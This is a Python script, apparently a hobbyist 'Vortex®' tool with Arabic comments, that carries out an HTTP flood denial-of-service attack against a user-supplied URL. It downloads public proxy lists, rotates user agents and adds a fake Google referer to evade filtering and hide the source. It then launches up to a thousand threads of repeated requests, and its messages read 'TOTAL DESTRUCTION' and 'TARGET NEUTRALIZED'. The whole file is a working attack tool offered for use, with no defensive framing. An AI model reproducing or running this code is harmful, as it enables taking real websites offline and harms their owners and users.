import os
import sys
import threading
import requests
import time
import random
from colorama import Fore, Style, init

init(autoreset=True)

# --- إعدادات الهوية ---
AUTHOR = "Vortex®"

# --- قوائم التمويه المحدثة ---
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edge/91.0.864.59",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
    "Mozilla/5.0 (Android 12; Mobile; rv:94.0) Gecko/94.0 Firefox/94.0",
    "Vortex-Bot/2.0 (Compatible; Extreme-Attack)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1"
]

def clear():
    os.system('clear')

def banner():
    print(f"""
{Fore.MAGENTA}
██╗   ██╗ ██████╗ ██████╗ ████████╗███████╗██╗  ██╗
██║   ██║██╔═══██╗██╔══██╗╚══██╔══╝██╔════╝╚██╗██╔╝
██║   ██║██║   ██║██████╔╝   ██║   █████╗   ╚███╔╝ 
╚██╗ ██╔╝██║   ██║██╔══██╗   ██║   ██╔══╝   ██╔██╗ 
 ╚████╔╝ ╚██████╔╝██║  ██║   ██║   ███████╗██╔╝ ██╗
  ╚═══╝   ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
          {Fore.RED}VORTEX® OMEGA-LEVEL STRIKER - STATUS: EVIL
    """)

def get_proxies():
    print(f"{Fore.YELLOW}[*] Scouring the web for fresh proxies...")
    try:
        # جلب قائمة بروكسيات محدثة لضمان عدم الحظر
        r = requests.get("https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all&ssl=all&anonymity=all")
        proxies = r.text.splitlines()
        print(f"{Fore.GREEN}[+] {len(proxies)} Proxies Loaded Successfully!")
        return proxies
    except:
        print(f"{Fore.RED}[!] Error fetching proxies. Using Direct IP.")
        return []

def vortex_attack(url, proxies, packets_per_thread):
    sent = 0
    while sent < packets_per_thread:
        try:
            # استخدام بروكسي عشوائي لكل طلب
            proxy = None
            if proxies:
                px = random.choice(proxies)
                proxy = {"http": f"http://{px}", "https": f"http://{px}"}
            
            headers = {
                'User-Agent': random.choice(user_agents),
                'Cache-Control': 'no-cache',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Referer': 'https://www.google.com/' # إضافة مصدر وهمي لتجاوز الفلاتر
            }
            
            # تنفيذ الهجوم
            requests.get(url, headers=headers, proxies=proxy, timeout=5)
            sent += 1
            print(f"{Fore.GREEN}[+] {AUTHOR} Attack Sent | Packets: {sent} | Via: {proxy['http'] if proxy else 'Direct'}")
        except:
            pass

def main():
    clear()
    banner()
    
    target = input(f"{Fore.CYAN}[?] Target URL (e.g., http://site.com): ")
    threads_num = int(input(f"{Fore.CYAN}[?] Threads Count (Recommended 1000): "))
    packets = int(input(f"{Fore.CYAN}[?] Packets Per Thread (e.g., 5000): "))
    
    use_proxy = input(f"{Fore.YELLOW}[?] Use Global Proxies? (y/n): ").lower()
    proxies = get_proxies() if use_proxy == 'y' else []
    
    print(f"\n{Fore.WHITE}{Style.BRIGHT}--- PREPARING TOTAL DESTRUCTION ---")
    time.sleep(2)
    
    print(f"{Fore.RED}[!] VORTEX® SYSTEM IS NOW FLOODING: {target}")
    
    for i in range(threads_num):
        t = threading.Thread(target=vortex_attack, args=(target, proxies, packets))
        t.daemon = True # لضمان إغلاق الخيوط عند إيقاف الأداة
        t.start()
    
    # إبقاء الكود يعمل حتى تنتهي الخيوط
    while threading.active_count() > 1:
        time.sleep(1)

    print(f"\n{Fore.MAGENTA}[#] TARGET NEUTRALIZED. ATTACK FINISHED.")

if __name__ == "__main__":
    main()
